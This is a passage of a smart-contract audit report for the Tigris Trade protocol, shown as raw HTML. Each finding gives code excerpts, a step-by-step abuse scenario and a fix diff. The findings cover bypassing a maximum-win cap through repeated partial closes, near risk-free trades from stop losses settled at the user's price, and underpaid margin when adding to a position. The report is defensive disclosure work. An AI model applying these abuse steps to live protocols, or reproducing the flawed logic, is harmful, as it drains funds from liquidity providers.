class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">627</span><span class=\"mtk1\">:                 }</span></span></span></code></pre>\n<p>But it checks the <code>maxWinPercent</code> between the partial payout and full margin so the below scenario is possible.</p>\n<ol>\n<li>Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.</li>\n<li>If <code>maxWinPercent</code> = 500%, Alice should receive 500 at most.</li>\n<li>But Alice closed 50% of the position and she got 500 for a 50% margin because it checks <code>maxWinPercent</code> with <code>_toMint = 500</code> and <code>_trade.margin = 100</code></li>\n<li>After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.</li>\n<li>As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We should check the <code>maxWinPercent</code> between the partial payout and partial margin like below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleCloseFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_payout</span><span class=\"mtk1\">)*</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_isBot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">partialMarginToClose</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_percent</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//+++++++++++++++++++++++</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">partialMarginToClose</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">partialMarginToClose</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1364949926\">TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1399445298\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, by partially closing an order, it is possible to bypass the <code>maxWinPercent</code> cap.</p>\n<p>Per similar discussion to <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/111\">#111</a> the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.</p>\n<p>Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1407802166\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"h-10-user-can-abuse-tight-stop-losses-and-high-leverage-to-make-risk-free-trades\" style=\"position:relative;\"><a href=\"#h-10-user-can-abuse-tight-stop-losses-and-high-leverage-to-make-risk-free-trades\" aria-label=\"h 10 user can abuse tight stop losses and high leverage to make risk free trades permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/622\">[H-10] User can abuse tight stop losses and high leverage to make risk free trades</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/622\">0x52</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/515\">hansfriese</a> and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/48\">noot</a></em></p>\n<p>User can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function limitClose(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint _id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool _tp,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    PriceData calldata _priceData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes calldata _signature</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _checkDelay(_id, false);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function _limitClose(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint _id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool _tp,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    PriceData calldata _priceData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes calldata _signature</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external view returns(uint _limitPrice, address _tigAsset) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _checkGas();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IPosition.Trade memory _trade = position.trades(_id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tigAsset = _trade.tigAsset;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    getVerifiedPrice(_trade.asset, _priceData, _signature, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _price = _priceData.price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_trade.orderType != 0) revert(&quot;4&quot;); //IsLimit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_tp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.tpPrice == 0) revert(&quot;7&quot;); //LimitNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.direction) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.tpPrice &gt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.tpPrice &lt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _limitPrice = _trade.tpPrice;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.slPrice == 0) revert(&quot;7&quot;); //LimitNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.direction) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.slPrice &lt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.slPrice &gt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //@audit stop loss is closed at user specified price NOT market price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _limitPrice = _trade.slPrice;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>When closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Take profit and stop loss trades should be executed at the current price rather than the price specified by the user:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">         if (_trade.tpPrice == 0) revert(&quot;7&quot;); //LimitNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.direction) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.tpPrice &gt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.tpPrice &lt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-       _limitPrice = _trade.tpPrice;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+       _limitPrice = _price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.slPrice == 0) revert(&quot;7&quot;); //LimitNotSet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_trade.direction) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.slPrice &lt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (_trade.slPrice &gt; _price) revert(&quot;6&quot;); //LimitNotMet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-       _limitPrice = _trade.slPrice;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+       _limitPrice = _price;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1377385352\">TriHaz (Tigris Trade) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Because of open fees, close fees and spread, that wouldn’t be profitable.</p>\n<p>We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1385147387\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a flaw in how the protocol offers Stop Losses.</p>\n<p>By using the originally stored value for Stop Loss, instead of just using it as a trigger, an attacker can perform a highly profitable strategy on the system as they know that their max risk is capped by the value of the Stop Loss, instead of the current asset price.</p>\n<p>This will happen at the detriment of LPs.</p>\n<p>Because the attack breaks an important invariant, causing a loss to other users, I agree with High Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-11-not-enough-margin-pulled-or-burned-from-user-when-adding-to-a-position\" style=\"position:relative;\"><a href=\"#h-11-not-enough-margin-pulled-or-burned-from-user-when-adding-to-a-position\" aria-label=\"h 11 not enough margin pulled or burned from user when adding to a position permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/659\">[H-11] Not enough margin pulled or burned from user when adding to a position</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/659\">minhtrng</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/644\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/505\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/488\">0Kage</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/433\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/325\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/209\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/194\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/130\">rvierdiiev</a></em></p>\n<p>When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio of <code>tigAsset</code>.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>Trading.addToPosition</code> the <code>_handleDeposit</code> function is called like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_handleDeposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_marginAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_addMargin</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_permitData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The third parameter with the value of <code>_addMargin - _fee</code> is the amount pulled (or burned in the case of using <code>tigAsset</code>) from the user. The <code>_fee</code> value is calculated as part of the position size like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_addMargin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The <code>_handleOpenFees</code> function mints <code>_tigAsset</code> to the referrer, to the <code>msg.sender</code> (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the <code>_addMargin</code> value paid by the user. Hence using <code>_addMargin - _fee</code> as the third parameter to <code>_handleDeposit</code> is going to pull or burn less margin than what was accounted for.</p>\n<p>An example for correct usage can be seen in <code>initiateMarketOrder</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_handleDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">marginAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stableVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_permitData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Here the third parameter to <code>_handleDeposit</code> is not <code>_marginAfterFees</code> but <code>_tradeInfo.margin</code> which is what the user has input on and is supposed to pay.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In <code>Trading.addToPosition</code> call the <code>_handleDeposit</code> function without subtracting the <code>_fee</code> value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_handleDeposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_marginAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_addMargin</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_permitData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1374444369\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1387116632\">Alex the Entreprenerd (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.</p>\n<p>While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).</p>\n<p>For this reason, I believe the finding to be of High Severity.</p>\n</blockquote>\n<p><strong><a 